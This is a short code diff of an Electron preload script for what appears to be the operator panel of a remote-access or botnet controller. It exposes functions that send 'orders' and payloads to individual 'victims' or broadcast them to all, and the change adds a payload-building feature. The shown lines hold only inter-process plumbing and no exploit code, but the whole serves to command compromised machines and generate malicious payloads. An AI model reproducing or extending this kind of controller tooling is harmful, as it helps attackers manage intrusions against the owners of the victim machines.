@@ -6,6 +6,8 @@ contextBridge.exposeInMainWorld("api", {
   order: (victim, payload) => ipcRenderer.send("order", { victim, payload }),
   broadcast: (payload) => ipcRenderer.send("order", { payload }),
   openLab: (victimId) => ipcRenderer.send("open-lab", victimId),
+  buildPayload: (config) => ipcRenderer.send("build-payload", config),
+  onBuildDone: (cb) => ipcRenderer.on("build-done", (_e, r) => cb(r)),
 
   onListenState: (cb) => ipcRenderer.on("listen-state", (_e, s) => cb(s)),
   onVictims: (cb) => ipcRenderer.on("victims", (_e, l) => cb(l)),
